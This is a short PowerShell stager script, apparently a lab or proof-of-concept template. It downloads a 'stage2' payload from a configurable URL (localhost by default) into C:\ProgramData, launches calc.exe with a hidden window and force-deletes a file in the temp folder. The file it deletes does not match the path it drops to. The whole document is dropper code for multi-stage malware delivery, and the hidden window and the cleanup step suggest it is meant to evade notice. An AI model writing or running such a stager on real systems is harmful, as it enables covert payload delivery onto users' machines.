[CmdletBinding()]
param(
    [string]$Stage2Url = "http://localhost:8000/stage2.bin",
    [string]$DropPath = 'C:\ProgramData\payload.bin'
)
(New-Object System.Net.WebClient).DownloadFile($Stage2Url, $DropPath)
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
